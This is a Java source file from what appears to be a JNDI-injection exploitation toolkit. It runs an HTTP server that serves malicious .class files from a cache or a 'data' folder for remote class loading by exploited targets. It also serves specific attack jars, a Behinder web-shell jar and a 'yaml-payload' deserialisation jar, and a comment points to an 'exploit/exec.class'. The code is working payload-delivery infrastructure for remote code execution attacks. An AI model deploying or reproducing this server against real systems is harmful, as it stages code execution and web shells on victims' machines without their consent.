package com.bloom.server;

import cn.hutool.core.io.file.FileReader;
import com.bloom.util.config;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.*;
import java.net.InetSocketAddress;

public class HttpServerStart {
    public static String cwd = System.getProperty("user.dir");

    public static void start1() throws IOException {
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8081), 0);
        httpServer.createContext("/", new TestHandler());
        httpServer.start();
        System.out.println("[+] HTTP Server Start Listening on " + 8081 + "...");
    }

    public static void start() throws IOException {

        HttpServer httpServer = HttpServer.create(new InetSocketAddress(config.httpPort), 0);
        httpServer.createContext("/", new HttpHandler() {
            @Override
            public void handle(HttpExchange httpExchange){
                try {
                    System.out.println("[+] New HTTP Request From " + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI());

                    String path = httpExchange.getRequestURI().getPath();
                    if(path.endsWith(".class")){
                        handleClassRequest(httpExchange);
//                    }else if(path.endsWith(".wsdl")){
//                        handleWSDLRequest(httpExchange);
                    }else if(path.endsWith(".jar")){
                        handleJarRequest(httpExchange);
//                    }else if(path.startsWith("/xxelog")){
//                        handleXXELogRequest(httpExchange);
//                    }else if(path.endsWith(".sql")){
//                        handleSQLRequest(httpExchange);
//                    }else if (path.endsWith(".groovy")){
//                        handlerGroovyRequest(httpExchange);
//                    }else if(path.endsWith(".xml")) {
//                        handleXMLRequest(httpExchange);
//                    }else if(path.endsWith(".txt")) {
//                        handleTXTRequest(httpExchange);
//                    }else if(path.endsWith(".yml")){
//                        handleYmlRequest(httpExchange);
                    }else{
                        handleFileRequest(httpExchange);
                    }
                } catch (Exception e) {
                    e.printStackTrace();

                }
            }
        });

        httpServer.setExecutor(null);
        httpServer.start();
        System.out.println("[+] HTTP Server Start Listening on " + config.httpPort + "...");
    }

    private static void handleFileRequest(HttpExchange exchange) throws Exception {
        String path = exchange.getRequestURI().getPath();
        String filename =  cwd + File.separator + "data" + File.separator +path.substring(path.lastIndexOf("/") + 1);
        File file = new File(filename);
        if (file.exists()){
            byte[] bytes = new byte[(int) file.length()];
            FileInputStream fileInputStream = new FileInputStream(file);
            fileInputStream.read(bytes);
            exchange.sendResponseHeaders(200, file.length());
            exchange.getResponseBody().write(bytes);
        }else {
            System.out.println("[!] Response Code: " + 404);
            exchange.sendResponseHeaders(404, 0);
        }
        exchange.close();

    }

    private static void handleClassRequest(HttpExchange exchange) throws Exception {
        String path = exchange.getRequestURI().getPath();
        String className = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
        System.out.println("[+] Receive ClassRequest: " + className + ".class");

        if(com.bloom.util.Cache.contains(className)){
            System.out.println("[+] Response Code: " + 200);

            byte[] bytes = com.bloom.util.Cache.get(className);
            exchange.sendResponseHeaders(200, bytes.length);
            exchange.getResponseBody().write(bytes);
        }else{
            String pa = cwd + File.separator + "data";
            File file = new File(pa + File.separator + className + ".class");

            if (file.exists()){
                byte[] bytes = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes);
                }
                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.sendResponseHeaders(200, file.length());
                exchange.getResponseBody().write(bytes);
            }else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }

        }
        exchange.close();
    }


    private static void handleJarRequest(HttpExchange exchange) throws IOException{
        String path = exchange.getRequestURI().getPath();
        String jarName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));

        if (jarName.equalsIgnoreCase("behinder3")){
            byte[] bytes =  null;
            String filename =  cwd + File.separator +"data" + File.separator + "behinder3.jar";
            FileReader fileReader = new FileReader(filename,"UTF-8");
            bytes = fileReader.readBytes();
            exchange.sendResponseHeaders(200, bytes.length + 1);
            exchange.getResponseBody().write(bytes);
        }else if (jarName.equalsIgnoreCase("yaml-payload")) {
            byte[] bytes =  null;
            String filename =  cwd + File.separator +"yaml-payload-master" + File.separator + "yaml-payload.jar";
            FileReader fileReader = new FileReader(filename,"UTF-8");
            bytes = fileReader.readBytes();
            exchange.sendResponseHeaders(200, bytes.length + 1);
            exchange.getResponseBody().write(bytes);
        }else {

            String filename =  cwd + File.separator +"data" + File.separator + jarName + ".jar";
            File file = new File(filename);
            if (file.exists()){
                byte[] bytes =  null;
                FileReader fileReader = new FileReader(filename,"UTF-8");
                bytes = fileReader.readBytes();
                exchange.sendResponseHeaders(200, bytes.length + 1);
                exchange.getResponseBody().write(bytes);
            }else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }

        }
        exchange.close();



    }

//    ---------------------------测试 ---------------------------
    public static void main(String[] args) throws IOException {
//        HttpServer httpServer = HttpServer.create(new InetSocketAddress(80), 0);
//        httpServer.createContext("/", new TestHandler());
//        httpServer.start();
//        httpServer.setExecutor(null);
        config.httpPort=8081;
        start();

    }

    private static class TestHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String path = exchange.getRequestURI().getPath();
            System.out.println("[+] New HTTP Request From " + exchange.getRemoteAddress() + "  " + exchange.getRequestURI());
            String className = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
//            System.out.println("[+] Receive ClassRequest: " + className + ".class");
            String pa = cwd + File.separator + "data";
            ///Users/lvzhibo/IdeaProjects/JNDIInject/target/classes/exploit/exec.class
            File file = new File(pa + File.separator + className + ".class");
            OutputStream out = exchange.getResponseBody();

            if (file.exists()){
                byte[] bytes = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes);
                }
                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.getResponseHeaders().add("Content-Disposition", "attachment;filename="+file.getName());
                exchange.sendResponseHeaders(200, file.length());
                out.write(bytes);
                out.close();
            }else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }
            exchange.close();
        }
    }

}


